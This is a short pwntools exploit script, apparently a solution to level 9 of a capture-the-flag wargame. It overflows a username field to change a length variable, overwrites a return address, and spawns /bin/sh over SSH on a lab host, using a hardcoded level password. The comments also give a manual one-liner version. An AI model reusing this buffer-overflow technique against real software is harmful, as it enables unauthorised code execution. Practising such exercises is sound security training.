from pwn import *

### INFORMATIONS ###
# Changing the "n" variable from username @ 41th character
# Overwriting return address in msg @ offset 199

payload = b''
payload += b'A' * 40
payload += b'\xff'
payload += b'B' * (128 - len(payload))
payload += b'C' * 199
payload += b'\x8c\x48\x55\x55\x55\x55'
payload += b'\x00' * (1024 - 207)
payload += b'/bin/sh\x00'

s = ssh(host="192.168.1.3", port=4242, user="level09", password="fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S")
p = s.process("/home/users/level09/./level09")

p.sendline(payload)
p.interactive()

#file = open("payload", "wb")
#file.write(payload)
#file.close()

### MANUAL EXPLOITATION ###

# python -c "print('A' * 40 + '\xff' + 'B' * 87 + 'C' * 199 + '\x8c\x48\x55\x55\x55\x55' + '\x00' * (1024 - 207) + '/bin/sh\x00')" > /tmp/payload
# cat /tmp/payload - | ./level09
